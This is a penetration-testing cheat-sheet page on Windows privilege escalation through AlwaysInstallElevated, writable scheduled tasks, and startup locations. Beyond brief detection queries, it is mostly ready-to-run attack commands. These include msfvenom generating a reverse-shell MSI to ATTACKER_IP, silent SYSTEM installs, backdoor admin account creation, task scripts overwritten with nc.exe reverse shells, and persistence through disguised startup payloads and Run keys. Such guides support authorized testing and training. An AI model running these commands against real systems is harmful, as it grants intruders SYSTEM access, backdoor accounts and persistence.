---
title: 'AlwaysInstallElevated & Scheduled Tasks'
description: 'Exploiting AlwaysInstallElevated registry misconfiguration and writable scheduled tasks for Windows privilege escalation.'
---

# AlwaysInstallElevated & Scheduled Tasks

---

## AlwaysInstallElevated

### The Vulnerability

If **both** of these registry keys are set to `1`, any user can install `.msi` (Windows Installer) packages with **SYSTEM** privileges:

- `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

### Detection

```cmd
:: Check both keys (BOTH must be 1 for exploitation)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1` → **exploitable**.

```powershell
# PowerUp check
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

WinPEAS also automatically checks this.

### Exploitation

```bash
# Step 1: Generate malicious MSI on attacker machine

# Reverse shell MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Or add local admin MSI
msfvenom -p windows/exec CMD="net localgroup Administrators hacker /add" -f msi -o evil.msi
```

```cmd
:: Step 2: Transfer and install on target (runs as SYSTEM)
msiexec /quiet /qn /i C:\temp\evil.msi
```

| Flag | Meaning |
|:-----|:--------|
| `/quiet` | Suppress all UI |
| `/qn` | No UI at all |
| `/i` | Install the MSI |

```bash
# Step 3: Catch the reverse shell
nc -lvnp 4444
```

### PowerUp Automated Exploitation

```powershell
# Generate and install MSI automatically
Write-UserAddMSI
:: Creates UserAdd.msi that adds a backdoor admin account
```

---

## Scheduled Tasks

### Finding Exploitable Scheduled Tasks

A scheduled task is exploitable if:
1. It runs as **SYSTEM** (or another privileged user)
2. The script/binary it executes is **writable** by your user

```cmd
:: List all tasks with details
schtasks /query /fo LIST /v

:: Filter for tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /B /C:"TaskName" /C:"Run As User" /C:"Task To Run" | findstr -A 1 "SYSTEM"
```

```powershell
# PowerShell — more structured output
Get-ScheduledTask | Where-Object { $_.Principal.UserId -match 'SYSTEM|Administrator' } |
    Select-Object TaskName, @{N='Action';E={$_.Actions.Execute}}, @{N='RunAs';E={$_.Principal.UserId}}
```

### Check Permissions on Task Scripts

```cmd
:: Once you find a task running as SYSTEM that executes a script:
:: Check if you can modify the script
icacls "C:\Scripts\backup.ps1"
icacls "C:\Scripts\cleanup.bat"

:: Look for (M)odify, (W)rite, or (F)ull Control for your user/group
```

### Exploitation

```cmd
:: Option A: Overwrite the script with a reverse shell
echo C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe > "C:\Scripts\backup.bat"

:: Option B: Append your command to the existing script
echo net localgroup Administrators hacker /add >> "C:\Scripts\cleanup.bat"

:: Option C: PowerShell script replacement
echo Invoke-Expression "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" > "C:\Scripts\backup.ps1"
```

### Trigger the Task

```cmd
:: Run the task immediately (if you have permission)
schtasks /run /tn "BackupTask"

:: If you can't trigger it, check when it next runs
schtasks /query /tn "BackupTask" /fo LIST /v | findstr /C:"Next Run"
```

### Creating a New Scheduled Task (if you have admin)

If you're already admin and need SYSTEM:

```cmd
:: Create a one-time task that runs as SYSTEM
schtasks /create /tn "Escalate" /tr "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" /sc once /st 00:00 /ru SYSTEM

:: Run it immediately
schtasks /run /tn "Escalate"

:: Clean up
schtasks /delete /tn "Escalate" /f
```

---

## Startup Applications

### Check Startup Directories

```cmd
:: Common startup directories
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Check write permissions
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Exploitation

If you can write to the global startup directory, any executable placed there runs for **all users** at login:

```cmd
:: Place payload in startup (will execute at next user logon)
copy C:\temp\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

### Registry Startup Keys

```cmd
:: Check for writable startup registry keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Add your own (current user)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\temp\payload.exe" /f
```
